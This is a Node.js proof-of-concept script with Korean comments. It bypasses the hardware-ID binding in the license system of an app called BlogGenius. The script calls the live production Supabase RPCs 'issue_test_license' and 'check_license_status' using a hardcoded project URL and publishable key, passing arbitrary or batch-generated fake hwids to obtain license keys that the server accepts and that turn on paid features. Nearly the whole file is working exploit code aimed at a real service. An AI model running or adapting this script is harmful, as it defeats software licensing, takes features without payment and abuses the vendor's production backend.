#!/usr/bin/env node
/*
 * BlogGenius v0.4.0 — `issue_test_license` hwid 우회 PoC
 * =======================================================
 * 목적: hwid이 실제 머신과 일치하지 않아도 임시 라이선스 키를 발급받아,
 *       서버가 해당 키를 유효한 키로受理(features 켜기)함을 증명한다.
 *
 * 취약점 근거 (소스):
 *   - src/license.js:295-329  `issue_test_license` RPC
 *       supabase.rpc('issue_test_license', { p_hwid: hwid })
 *       issuedKey = String(data?.license_key || '').trim()   // 서식 외 검증 없음
 *       (hwid과 키의 바인딩을 클라이언트가 확인하지 않음)
 *   - src/license.js:754       `check_license_status` RPC (발급 키로 재검증)
 *   - src/config/secret.js     생산 Supabase url + anon (publishable) key
 *   - (2차 분석) secret.js는 crypto 없는 placeholder → 로컬 암호화 없음
 *
 * 우회 방식: 임의/합성 hwid으로 issue_test_license를 호출 → 키 발급 →
 *            check_license_status로 서버受理 확인. hwid은 임의로 바꿔도 됨.
 *
 * 사용법:
 *   node bloggenius_hwid_bypass.mjs                       // 고정 POC hwid 사용
 *   node bloggenius_hwid_bypass.mjs --hwid <hwid>         // 임의 hwid 사용
 *   node bloggenius_hwid_bypass.mjs --synthetic-count 5   // 여러 hwid에서 재현
 *
 * 주의: 이 스크립트는 실제 생산 Supabase에 RPC를 송신합니다 (PoC용).
 */

const SUPABASE_URL = process.env.BLOGGENIUS_SUPABASE_URL || 'https://hocfjolcthvtgfaxjmse.supabase.co';
const SUPABASE_ANON = process.env.BLOGGENIUS_SUPABASE_PUBLISHABLE_KEY || 'sb_publishable_4DObqEWTXyZNRlmJdB3bqQ_BstyktIJ';

const args = process.argv.slice(2);
const opt = (name) => {
    const i = args.indexOf(name);
    return i >= 0 ? args[i + 1] : undefined;
};

const HWID = opt('--hwid') || 'POC-DEMO-HWID-0000';
const COUNT = opt('--synthetic-count') ? Number(opt('--synthetic-count')) : 0;

// Supabase `supabase.rpc()`는 Postgres RPC로 `{url}/rpc/{name}`을 사용합니다
// (Edge Function의 `/functions/v1/{name}`이 아님 — 이 앱은 모두 Postgres 함수).
// Supabase `supabase.rpc()`가 송신하는 정확히 동일한 URL/헤더를 재현합니다.
// 핵심: 경로는 `/rpc/{name}`이 아니라 `/rest/v1/rpc/{name}` (이걸 안 보면 404 "requested path is invalid").
const rpc = async (name, params) => {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/rpc/${name}`, {
        method: 'POST',
        headers: {
            apikey: SUPABASE_ANON,
            Authorization: `Bearer ${SUPABASE_ANON}`,
            'content-profile': 'public',
            'Content-Type': 'application/json',
            Accept: 'application/json',
        },
        body: JSON.stringify(params),
    });
    let data = null, errorText = null;
    try { data = await res.json(); } catch { errorText = `HTTP ${res.status}: ${await res.text()}`; }
    if (!res.ok || !data || data.success === false) {
        return { ok: false, http: res.status, data, error: `${res.status} ${errorText || data?.message || 'unknown'}` };
    }
    return { ok: true, data };
};

const features = (f) => {
    if (!f || typeof f !== 'object') return '(features 없음)';
    return Object.entries(f).map(([k, v]) => `${k}=${v ? '✅' : '🚫'}`).join('  ');
};

async function demo(hwid) {
    console.log(`\n──────── hwid="${hwid}" ────────`);
    // 1) hwid만으로 임시 키 발급
    const issue = await rpc('issue_test_license', { p_hwid: hwid });
    if (!issue.ok) {
        console.log(`issue_test_license 실패: ${issue.error}`);
        return { success: false, reason: issue.error };
    }
    const key = String(issue.data.license_key || '').trim();
    if (!key) {
        console.log(`issue_success=true이나 license_key가 없음:`, issue.data);
        return { success: false, reason: 'no license_key in response' };
    }
    console.log(`issue_test_license  ✅ success=${issue.data.success}  key=${key.slice(0, 24)}…`);

    // 2) 발급 키로 서버 재검증 (features 켜지는지)
    const status = await rpc('check_license_status', { p_license_key: key, p_hwid: hwid });
    if (!status.ok) {
        console.log(`check_license_status 실패(키 미受理): ${status.error}`);
        return { success: false, reason: 'server rejected issued key', key };
    }
    const f = status.data.features || {};
    const allOn = Object.values(f).every(Boolean);
    console.log(`check_license_status ✅受理  remaining=${status.data.remaining ?? '?'}  plan=${status.data.plan_code ?? '?'}`);
    console.log(`  features          : ${features(f)}`);
    const result = { success: true, key, remaining: status.data.remaining, features: f, allOn };
    console.log(allOn ? '  >> Bypass 성공: 임의 hwid으로 기능 활성화 키 확보' : '  >> 키는受理되었으나 일부 feature가 꺼짐');
    return result;
}

(async () => {
    console.log(`BlogGenius issue_test_license hwid 우회 PoC`);
    console.log(`target: ${SUPABASE_URL}   env: production (public anon RPC)`);
    const first = await demo(HWID);
    let synced = first;
    if (COUNT > 0) {
        console.log(`\n==synthetic hwid ${COUNT}개 재현==`);
        for (let i = 1; i <= COUNT; i++) {
            const r = await demo(`POC-SYNTHETIC-HWID-${String(i).padStart(4, '0')}`);
            if (r && r.allOn) synced = r;
        }
    }
    const ok = !!(first && first.allOn);
    console.log(`\n결과는: ${ok ? '✅ Bypass 검증 완료 (hwid과 무관하게 임시 키/기능 확보)' : '⚠️ 키는 받았으나 기능 활성화까지 이르지 못함'}`);
    process.exit(ok ? 0 : 1);
})();
